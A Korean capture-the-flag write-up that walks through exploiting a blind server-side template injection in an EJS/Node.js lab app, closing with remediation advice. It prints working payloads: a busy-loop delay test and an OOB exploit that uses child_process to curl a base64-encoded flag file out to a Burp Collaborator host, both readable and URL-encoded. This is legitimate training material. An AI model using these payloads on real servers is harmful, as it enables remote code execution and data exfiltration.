+++
title = "VulnABLE CTF [LUXORA] Write-up: SSTI 🥇 Gold"
description = "LUXORA 플랫폼의 Blind SSTI 환경에서 Out-of-Band(OOB) 통신을 이용한 데이터 탈취 상세 롸잇업"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "SSTI", "Gold", "Blind", "OOB", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: SSTI 🥇 Gold

## 🎯 챌린지 개요
- **카테고리**: Injection Layer (SSTI)
- **난이도**: 🥇 Gold
- **타겟 경로**: `/ssti/gold`
- **목표**: 템플릿의 렌더링 결과나 에러 메시지가 화면에 전혀 출력되지 않는 **Blind SSTI** 환경에서, 서버를 조종하여 외부 네트워크로 데이터를 전송(OOB)하게 만들어 플래그를 탈취하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 반응 분석 (Reconnaissance)

`/ssti/gold` 는 사용자가 자신의 상태 메시지(Status)를 업데이트하는 기능입니다.

어떤 메시지를 입력하든 화면에는 오직 `Profile updated successfully.` 라는 고정된 메시지만 출력됩니다.

```http
POST /ssti/gold
status=Happy

POST /ssti/gold
status=<%= 7*7 %>
```

**[해커의 사고 과정]**
1. 화면에 어떠한 동적인 결과도 보이지 않는다. 
2. 내가 넣은 코드가 EJS 템플릿 엔진에서 실행되고 있는지 여부조차 알 수 없다.
3. 이를 증명하려면, 서버가 나에게 응답을 주는 '시간'을 인위적으로 지연(Time-based)시켜 보거나, 아예 다른 채널로 나에게 신호를 보내게(Out-of-Band) 만들어야 한다!

---

## 💥 2. 취약점 검증 (Time-based Blind Test)

EJS 환경에서 Node.js 프로세스를 잠시 멈추게 하는(Sleep) 코드를 주입하여 취약점 존재 여부를 확인합니다.

### 지연 유발 페이로드 (동기식 무한 루프)
Node.js는 싱글 스레드이므로, `while` 루프를 강제로 돌리면 그 시간 동안 서버 응답이 멈춥니다.
```javascript
<% const start = Date.now(); while(Date.now() - start < 5000); %>
```

### 전송 및 결과
```http
POST /ssti/gold
status=<%25%20const%20start%20%3D%20Date.now()%3B%20while(Date.now()%20-%20start%20%3C%205000)%3B%20%25>
```
요청 후 정확히 **5초 뒤에** `Profile updated successfully.` 메시지가 반환되었습니다.
이로써 Blind SSTI 취약점이 확실히 작동하고 있음을 증명했습니다.

---

## 🚀 3. OOB 데이터 추출 및 익스플로잇 (Exploitation)

화면에 플래그를 띄울 수 없으니, 서버 내부의 플래그 파일을 읽어서 해커가 통제하는 외부 도메인(Burp Collaborator 등)으로 HTTP 요청을 날리게 만들어야 합니다.

### 💡 OOB 페이로드 설계
EJS 태그 안에서 Node.js의 `fs` 모듈로 파일을 읽고, `child_process` 로 `curl` 명령어를 실행하는 로직을 짭니다.

**[작성 로직]**
1. `fs` 모듈을 불러와서 `flag_ssti_gold.txt` 파일을 읽는다.
2. 읽은 값을 URL에서 안전하게 전송하기 위해 Base64로 인코딩한다.
3. `child_process`를 불러와서 해커의 서버로 `curl` GET 요청을 보낸다. (쿼리스트링에 Base64 플래그 탑재)

```javascript
<% 
  const fs = global.process.mainModule.require('fs');
  const child = global.process.mainModule.require('child_process');
  
  // 파일 읽기 및 Base64 인코딩
  const flagBase64 = fs.readFileSync('flag_ssti_gold.txt').toString('base64');
  
  // 해커 서버로 전송 (해커 도메인: abc123xyz.burpcollaborator.net)
  child.execSync('curl http://abc123xyz.burpcollaborator.net/?data=' + flagBase64); 
%>
```

### 🚀 페이로드 전송
위 코드를 한 줄로 만들고 `<% %>` 태그로 감싼 뒤 URL 인코딩하여 전송합니다.

```http
POST /ssti/gold
status=<%25%20const%20fs%3Dglobal.process.mainModule.require('fs')%3Bconst%20child%3Dglobal.process.mainModule.require('child_process')%3Bconst%20flagBase64%3Dfs.readFileSync('flag_ssti_gold.txt').toString('base64')%3Bchild.execSync('curl%20http%3A%2F%2Fabc123xyz.burpcollaborator.net%2F%3Fdata%3D'%2BflagBase64)%3B%20%25>
```

### 🔍 해커의 OOB 서버 로그 확인
타겟 서버는 여전히 화면에 `Profile updated...` 라고만 응답했지만, 백그라운드에서는 우리의 `curl` 명령어를 충실히 실행했습니다. 
해커의 수신 서버(Burp Collaborator)에 다음과 같은 HTTP 요청이 도착했습니다!

```text
[HTTP GET Request Received]
URI: /?data=RkxBR3tTU1RJXw... (Base64 인코딩된 플래그 값)
Source IP: 10.10.10.10
User-Agent: curl/7.68.0
```

Base64 문자열을 디코딩합니다.
`RkxBR3tTU1RJX...` ➔ `FLAG{SSTI_🥇_BLIND_OOB_X4Y5Z6}`

---

## 🚩 4. 롸잇업 결론 및 플래그

화면 출력을 완벽히 막았다고 하더라도, 템플릿 엔진 자체가 가진 강력한 런타임 권한(OS 자원 접근 및 네트워크 통신)을 악용하여 데이터를 외부로 빼돌리는 데 성공했습니다.

**🔥 획득한 플래그:**
`FLAG{SSTI_🥇_BLIND_OOB_X4Y5Z6}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
블라인드(Blind) 환경이라고 해서 근본적인 방어가 된 것은 아닙니다. 코드가 실행된다는 사실 자체가 문제입니다.

1. **아웃바운드 망 분리 (Egress Filtering)**
   서버가 웹 렌더링을 수행하는 망에서는 외부 인터넷으로 나가는 트래픽(HTTP, DNS)을 방화벽에서 기본적으로 차단(Deny All)해야 합니다. 이를 통해 해커가 코드를 실행시키더라도 데이터를 외부로 유출(OOB)할 수 없게 막아야 합니다.
2. **템플릿 엔진의 데이터 바인딩 철저 준수**
   템플릿 문자열에 동적 입력을 결합(`+`)하지 말고, 두 번째 인자로 넘기는 프레임워크 표준 사용법을 준수해야 합니다.
3. **VM 샌드박스 (Sandboxing)**
   불가피하게 사용자 입력을 템플릿으로 받아야 한다면, Node.js의 `vm2`나 `isolated-vm` 모듈을 사용하여 렌더링 컨텍스트가 OS 레벨의 `require`, `process` 에 접근하지 못하도록 철저히 격리해야 합니다.